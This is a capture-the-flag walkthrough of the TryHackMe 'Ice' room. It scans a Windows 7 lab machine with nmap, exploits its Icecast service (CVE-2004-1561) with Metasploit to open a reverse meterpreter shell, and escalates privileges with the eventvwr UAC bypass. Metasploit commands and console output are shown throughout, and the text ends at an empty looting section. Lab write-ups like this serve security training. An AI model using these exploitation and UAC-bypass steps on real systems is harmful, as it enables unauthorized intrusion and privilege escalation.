# Ice

## 1. Connect
ezpzlmnsqz

---

## 2. Recon
run: `nmap -sC -sV -A BOX_IP`

-A: Enable OS detection, version detection, script scanning, and traceroute

--script=vuln: use the vuln detection script. 

-sV: Probe open ports to determine service/version info 

**Scan Results**
```


```



### Deploy the machine! This may take up to three minutes to start.
`done`

### Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'RP: Nmap' prior to this room.
`done`

### Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
`3389`

### What service did nmap identify as running on port 8000? (First word of this service)
`Icecast`

### What does Nmap identify as the hostname of the machine? (All caps for the answer)
`DARK-PC`

---

## 3. Gain Access
### Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it?



`Execute Code Overflow`


### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
`CVE-2004-1561`

### Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`
`done`


### After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
```
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```

`exploit/windows/http/icecast_header`



### Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.
```
msf6 exploit(windows/http/icecast_header) > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
```


###  Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
```
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     MY_IP       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```
`RHOSTS`

###  First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit` 
```
msf6 exploit(windows/http/icecast_header) > set RHOSTS  10.10.82.95 
RHOSTS => 10.10.82.95
```
```
msf6 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 10.2.60.96:4444 
[*] Sending stage (175174 bytes) to 10.10.82.95
[*] Meterpreter session 1 opened (10.2.60.96:4444 -> 10.10.82.95:49258) at 2021-02-01 00:02:31 -0500

meterpreter > 
```


---

## 4. Escalate

### Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
First of all, `:stonks:` XD
`meterpreter`

###  What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room. 
```
meterpreter > getuid
Server username: Dark-PC\Dark
```
`Dark`

### What build of Windows is the system?
```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
`7601`

### Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
`x64`

### Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.82.95 - Collecting local exploits for x86/windows...
[*] 10.10.82.95 - 35 exploit checks are being tried...
[+] 10.10.82.95 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.82.95 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.82.95 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```



### Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
`exploit/windows/local/bypassuac_eventvwr`

###  Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell. 
```
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.2.60.96:4444 -> 10.10.82.95:49258 (10.10.82.95)
```


###  Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT` 
```
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```


### Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
```
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
```


### Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
`LHOST`


### Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`
`*did not need to do this*`

### After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 
```
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.2.60.96:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 10.10.82.95
[*] Meterpreter session 2 opened (10.2.60.96:4444 -> 10.10.82.95:49273) at 2021-02-01 00:16:55 -0500
[*] Cleaning up registry keys ...
```


### Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`
`*happens automatically*`

### We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
`SeTakeOwnershipPrivilege`

## 5. Looting
